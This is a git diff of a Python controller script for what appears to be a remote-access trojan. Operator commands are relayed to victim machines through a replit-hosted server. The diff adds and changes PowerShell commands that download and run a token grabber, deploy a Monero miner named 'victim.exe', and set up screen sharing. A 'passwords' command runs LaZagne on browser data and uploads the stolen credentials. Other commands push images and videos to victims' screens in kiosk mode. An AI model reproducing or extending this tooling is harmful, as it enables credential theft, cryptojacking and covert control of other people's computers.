@@ -19,7 +19,7 @@ POST_URL = "https://epic-servering-but-pytyohn.jonathanbreitg.repl.co/POST-CONTR
 while True:
 	command_to_send = input("SHELL>")
 	if command_to_send == "token":
-		command_to_send = "thread powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/grab_token.exe?raw=true.exe', 'grab_token.exe');./grab_token.exe"
+		command_to_send = 'thread powershell;powershell start-bitstransfer -source "https://github.com/jonathanbreitg/monero-minerV2/blob/main/grab_token.exe?raw=true" -destination "grab_token.exe" -TransferType Download;./grab_token.exe'
 	elif command_to_send == "cpu":
 		command_to_send = "wmic cpu get loadpercentage"
 	elif command_to_send == "r":
@@ -29,19 +29,21 @@ while True:
 	elif command_to_send == "barak1.5":
 		command_to_send = "start chrome -kiosk -fullscreen https://media.discordapp.net/stickers/865029615457271828.png?size=160"
 	elif command_to_send == "mine_monero":
-		command_to_send = "thread powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/victim.zip?raw=true', 'victim.zip');Expand-Archive -Path victim.zip -DestinationPath victim;cd victim;cd victim;./victim.exe"
+		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/monero-minerV2/blob/main/victim.zip?raw=true" -destination "victim.zip" -TransferType Download;Expand-Archive -Path victim.zip -DestinationPath victim;cd victim;cd victim;./victim.exe'
 	elif command_to_send == "barak2":
-		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://media.discordapp.net/stickers/865029615457271828.png?size=160', 'barak.png');./barak.png"
+		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/865029615457271828.png%3Fsize=160?raw=true" -destination "barak.png" -TransferType Download;./barak.png'
 	elif command_to_send == "barak3":
-		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4"
-	elif command_to_send == "barak3.5":
-		command_to_send = "start chrome -kiosk -fullscreen --no-user-gesture-required https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4"
+		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/barakVID.mp4?raw=true" -destination "barakVID.mp4" -TransferType Download;./barakVID.mp4'
 	elif command_to_send == "barak4":
-		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');./barak4.png"
+		command_to_send = 'powershell;start-bitstransfer -source "https://raw.githubusercontent.com/jonathanbreitg/dump/main/3e789542-37fc-4ebb-8692-ce143393ff37.png" -destination "barak4.png" -TransferType Download;./barak4.png'
 	elif command_to_send == "barak4.5":
 		command_to_send = "start chrome -kiosk -fullscreen https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png"
+	elif command_to_send == "screen-share":
+		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/server.zip?raw=true" -destination "server.zip" -TransferType Download;Expand-Archive -Path server.zip -DestinationPath server;cd server;cd server;./server.exe'
+	elif command_to_send == "passwords":
+		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/lazagne.exe?raw=true" -destination "lazagne.exe" -TransferType Download;cmd start cmd /c lazagne.exe browsers -oN -output asd;powershell start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -destination "uploader.exe";./uploader.exe credential*.txt'
 	elif command_to_send == "ult_barak":
-		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4;sleep 2;$client = new-object System.Net.WebClient;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');./barak4.png;sleep 1;start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160;sleep 3;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');./barak4.png;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');./barakVID.mp4;start chrome -kiosk -fullscreen https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png"
+		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/barakVID.mp4?raw=true" -destination "barakVID.mp4" -TransferType Download;./barakVID.mp4;./barakVID.mp4;sleep 2;start-bitstransfer -source "https://raw.githubusercontent.com/jonathanbreitg/dump/main/3e789542-37fc-4ebb-8692-ce143393ff37.png" -destination "barak4.png" -TransferType Download;./barak4.png;sleep 1;start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160;sleep 3;./barakVID.mp4;./barak4.png;./barakVID.mp4;start chrome -kiosk -fullscreen https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png'
 	pre = requests.get(url="https://epic-servering-but-pytyohn.jonathanbreitg.repl.co")
 	pre = pre.text
 	obj = {"data":str(command_to_send)}
